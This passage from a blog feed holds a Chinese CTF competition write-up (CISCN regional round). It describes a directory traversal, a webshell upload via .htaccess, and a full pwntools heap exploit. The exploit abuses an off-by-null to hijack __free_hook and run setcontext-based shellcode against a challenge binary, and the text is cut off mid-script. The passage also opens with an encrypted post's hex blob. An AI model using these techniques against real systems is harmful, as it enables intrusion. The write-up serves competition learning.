cb0234a4b1a6f3094b2acc393ffcc7c4fabc5752e446f3b68449a8ba777754bc4da85734f61af1c42ce2f7f8c849f04afc4517f13750f8c2c00ce54d355bcd95c8b191a702751f86d24ec44c039a63196414588ba9500f609968cc0779dbbe3cbde4144bb418163554d63c30b458a337a4b9c17f0d653485ac544289d48ac27559592dafe27c6c1759d45c4cefe0de0857593e273f119740a67e243cfe8c46a10d4a6becf035662220d7dc75d00ac8b2a0a97ceeafdd51eb9d75835fb73a238b5937c5ec3a1157204429fe4418a8803d8f62538b19a9d3aff7d4918e227a059f9b996b4c729972eef30c182ee799dda514ee70c9ab780905b034276f6dcff82f85c5f1774b5dc3966895b54ed951f36ea3ba19b851fe9ba2e970ca840fd4fd1f60bb68554f61bad0c2e976ad136276f449921e13d53aa3febb69c457f3848bb51688b6eb73c7973651e44e9d3ef655a53b2bc506577b9cbb9e7ffe570f7e90628da1d848fa296628e6501f90eb890638d92b48ebd7432c90e84250adb70e15c3406fad65e593ea299d53e6b24dd1f40c79bdb1b4ceaa8f636babb028c62a85aecd744d3eeae2b55d1b6d4b1b39db591d3984459aa023522dc79748db962073a6375932164d080eb8aaa6750854d823b917a1274ac07d4f731ec6afe75e44618f69190001c9d01178a271221623faf63194af7971401fc33affc268897f40fa4415455c376a698c89c8515cf54d215d2312657c6499abc0eea339e68c295246c5dd6ba2c791a6f94054135137aba8cdc47dd46a575ee6e12039c26523a26b283c73b01aaba25814ea3e4bd9d6f47aec39ba3b04f0ed17d6b5a88e2ab54f924a9eb94c454f1d8874d01d0b15714ded31f4dd857aafe9799bc28690b23e287dafe33892a72f1a6aad90ff70a8f7de2e3fac638ad3ef7ec2cbb395dc3414f451d4bbe03f668098365206375791aa2707c2fc3f7db6ffbbe371752cf34edf86f63fdc03f3ca1c00c8f0263e4b9e7ab078c9d098a2c3b0d051f90f0295a5eae24adbb4f0f873c890787e02d89bb3adb1d4cc6286fc3524694e52b84bc80e4a62a6276d32c168efa53da84448d338cab6d4827f9579d450f7f204de6f3b60c03a8d32698d8f6a200d2046190a4cd68b65adb16aa3ffdc1acad7eb6d312e01fc66d6400630fd1ad53beafd1d8d301663de44041779b92ece008916bca542011995c8aa8fa26ddbebd0f2f3c1aff50bb4c1e2f761dfab550a9bb4e22b2ac9c745b1a8d770637d0bb980db82b402842e3c2769c73af88a5d6fdbad8e332dc6e3d9f947e8739d69a20838a6260cffd03144bcf25434c8c4048fe93ea1f5a7e7fabf409cb3cd951b26fd590fafd3ba107128a41b554af6394345e0155f346ea0b4a23a951ddb5dbc2b61f5a453502ba671771b74b961e142ac5a64a1ad8cdaca666e648cfb5a69332aed76da657e849a310061af41d03de04e80ef44478ddf8f74035df7dcd317ba2cca1c81a342defc967a50922e9837553d3866fac5f73fa396301c3998d159099c963f37e734062735ed020011fd8fae62848d3aae7361cdb7fa08781aa8b055df6f88f1a90e35cf03660df44a9572d27302f51b15d9941efd9bcfe4b2acbde998269d2ad06165a5f939b337c4d550e63f9c3a20cfe3a7b4a8c58e51b3f88757eeea4d574467d66c5c59bccfda8c544e5b2c9f7f3bd011ffb5c0d3ded5dcf483f4324adedf6d6b2ed09f22c949a28f792f1aad364fe818e53c3c02b974ba9a2e7cd3cf350364b6f140296cc3398118bc8ae77eeb0d35f12845d9978ebbeba837a572589a93e18f33a1cbf6c9e3423d82d2b93fe2db88a46c5eae9e39ed737e50faeafc23f201a8de5f37074e2e704be82cdcc1d3801e03772ce82e0d7bd7ebec1724629b7283c8dc1974c6444bfe425e63aa7e7daf59f98ce5e9eaafb2a1c8088f184102997e7ad283d9f741f4ae0ff91e2b166e96f28da061751e37b7f97ab0a30fb1855d80b915c20dfba57cb54dc0d38e13ffe830b36bd2cea81b1d6af84d65b2c982b8c4a1ab49fe19213c7fc12acb8ba6c8b072bd2ccbb7e363da145af8232d39586233298989614fa7afb850d52b76af1f9c1766cabe533cd77891df95c6f96a3b90fab0815f4acf895535bab01f0e54042be846287bcdfa01f3320b4a1b24f0ba85252d2cb72e5d959882ec5d1b2cd487c4d22b6033094a3803d43090a80662353c2b230fd42f11de95e5ce2662036a7d82f9fab4ee147189ab1474d4fcdc884c13d6a735729661254f68a50441c339d86aa540b20293569999ae111e546234be3eddf97fbe1d44e73b1177f94e0d29bf919b83f95e0c68d0f92606ffdf51d2988ad3842bfe1befe58b0637364c5bdb2c97fe965a04b1d601a433c363a2c4e0217c5d5f5527247889ae8cf2f1b9effc82b5a890281526307dfb8fefa60cae246887c1b08f716aa60facfac5c67c571b5fbc4d949603223f5e7d8355944c0dc41d5fb7ada93a89cf584c70c3ef7e81c87152465d868ce7dbc06cd56ccdd51cb875f62c8c0b178f283dfaf3957c435a9f1c5027dc0ada24b7db0323a94cc77abcf4c22aaa5e66a709bc969fb421552e0b06e04ca82beca954d4840a796b7607a0e474a57f8f3b4d7d317bfe90c16493a907fd91853fccc491fe23fc343afd4219e54d2f768c4de7193dd04a14f67479854f50915591db672a8f2439b2560761f42d3628c56e63499cb61756edf706d57e2e1f5cf829407b28d8bbc9ca633ae0c2c2d56bfe7b61adbcc12d6297906d06eccb2a6a20ab27fba5d66ef83974aa88605d7eb6ead15661e3ee97fd288b5c317ec7167cd150da93f09a49ebf0c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">已经在做了，快了快了</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ArchLinux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN华中赛区分区赛-部分wp</title>
    <link href="/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/"/>
    <url>/2022/06/29/CISCN%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%88%86%E5%8C%BA%E8%B5%9B-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<blockquote><p>首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1723">https://forum.butian.net/share/1723</a></p></blockquote><p>这次分区赛成绩不太理想，有些题目确实有点脑洞，花了很久的时间才做出来，加上题目分值感觉也有点离谱，misc和re真的是大爷了，pwn，web属于是打酱油。</p><p>最后只有15名，随便解出来一个题就进决赛了，，，😭</p><h3 id="web1"><a class="header-anchor" href="#web1">¶</a>web1</h3><p>目录穿越，对脑电波找文件，找了半天以为要rce，结果是flag.php。。。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fd5d3335b36c5a77b504a80b7f83f21bb4cccef4.png" alt="图片.png"></p><h3 id="web2"><a class="header-anchor" href="#web2">¶</a>web2</h3><p>首先，使用burpsuite抓包，返回报文中有identity字段</p><p>加入identity字段后,返回一个可以文件上传的页面A0ther_hldden_PaGe.php</p><p>经过fuzz之后只能上传.jpg，同时发现可以上传.htaccess，因此上传图片马，并上传.htaccess使之解析为php</p><p>之后使用蚁剑链接，找到flag。<br>（web选手没有存图）</p><h3 id="pwn1"><a class="header-anchor" href="#pwn1">¶</a>pwn1</h3><p>上午发的第一道pwn，也是唯一解出来的一道pwn，webpwn，但是只是模拟了http的请求处理过程，而没有开web端口之类的，类似于httpd，重点还是审计代码。<br>审完之后是在edit处存在一个off_by_NULL。<br>环境是libc2.27，开了沙箱需要orw。照着板子，后面绕一下0截断就行了。<br>exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token comment">#----------------------------------------------</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>s<span class="token punctuation">,</span>n<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>ti <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#----------------------------------------------</span>http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''GET /&#123;&#125; HTTP/1.1\r\nHost: Epiphany\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length\r\n'''</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("10.75.1.22",'58012')</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /login HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUsername: C4oy1\r\nPassword: 123\r\nContent-Length: &#123;&#125;\r\n\r\nUsername=C4oy1&amp;Password=123\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0x1e</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /create HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit11</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit22</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /edit HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: &#123;&#125;\r\n\r\n&#123;&#125;'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /delete HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    http_packet <span class="token operator">=</span> <span class="token triple-quoted-string string">'''POST /show HTTP/1.1\r\nHost: Epiphany\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nIdx: &#123;&#125;\r\nContent-Length: 0\r\n\r\n'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"test> "</span><span class="token punctuation">,</span> http_packet<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">replace0</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> <span class="token string">'a'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            r <span class="token operator">+=</span> i    <span class="token keyword">return</span> rlogin<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''gdb.attach(sh, "b *$rebase(0x00000000000280C))pause()'''</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>set_context  <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">53</span>mprotect <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#off by null</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x67</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf7</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>edit11<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">0x460</span><span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x450</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>free_hook <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xa0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span>sig <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rdi <span class="token operator">=</span> free_hook <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span>sig<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x2000</span>sig<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>sig<span class="token punctuation">.</span>rip <span class="token operator">=</span> mprotectsig<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>free_hook<span class="token operator">+</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>sc <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>set_context<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> sc<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>sc_addr <span class="token operator">=</span> free_hook <span class="token operator">+</span> <span class="token number">0x28</span><span class="token comment"># gdb.attach(sh, "b *$rebase(0x00000000000280C)\nc\n")</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x12</span> <span class="token operator">+</span> sc<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sc_addr <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>sc_addr <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mprotect <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>mprotect <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>set_context <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span><span class="token punctuation">(</span>set_context <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> replace0<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>sig<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xaf</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">0xae</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token 